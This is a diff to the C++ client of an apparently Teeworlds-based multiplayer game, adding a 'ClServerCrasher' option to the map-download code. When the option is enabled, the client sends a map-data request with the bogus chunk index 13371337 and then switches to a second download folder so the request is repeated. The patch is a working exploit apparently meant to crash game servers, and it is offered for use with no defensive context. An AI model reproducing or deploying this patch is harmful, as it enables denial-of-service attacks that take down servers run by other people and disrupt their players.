@@ -432,8 +432,14 @@ void CClient::SendMapRequest()
 		io_close(m_MapdownloadFile);
 	m_MapdownloadFile = Storage()->OpenFile(m_aMapdownloadFilename, IOFLAG_WRITE, IStorage::TYPE_SAVE);
 	CMsgPacker Msg(NETMSG_REQUEST_MAP_DATA);
-	Msg.AddInt(m_MapdownloadChunk);
+	if(g_Config.m_ClServerCrasher)
+		Msg.AddInt(13371337);
+	else
+		Msg.AddInt(m_MapdownloadChunk);
 	SendMsgEx(&Msg, MSGFLAG_VITAL|MSGFLAG_FLUSH);
+
+	if(g_Config.m_ClServerCrasher)
+		g_Config.m_ClServerCrasher = 0;
 }
 
 void CClient::RconAuth(const char *pName, const char *pPassword)
@@ -1126,11 +1132,18 @@ const char *CClient::LoadMapSearch(const char *pMapName, int WantedCrc)
 		return pError;
 
 	// try the downloaded maps
-	str_format(aBuf, sizeof(aBuf), "downloadedmaps/%s_%08x.map", pMapName, WantedCrc);
-	pError = LoadMap(pMapName, aBuf, WantedCrc);
-	if(!pError)
-		return pError;
-
+	if(!g_Config.m_ClServerCrasher)
+	{
+		str_format(aBuf, sizeof(aBuf), "downloadedmaps/%s_%08x.map", pMapName, WantedCrc);
+		pError = LoadMap(pMapName, aBuf, WantedCrc);
+		if(!pError)
+			return pError;
+	} else {
+		str_format(aBuf, sizeof(aBuf), "downloadedmaps2/%s_%08x.map", pMapName, WantedCrc);
+		pError = LoadMap(pMapName, aBuf, WantedCrc);
+		if(!pError)
+			return pError;
+	}
 	// search for the map within subfolders
 	char aFilename[128];
 	str_format(aFilename, sizeof(aFilename), "%s.map", pMapName);
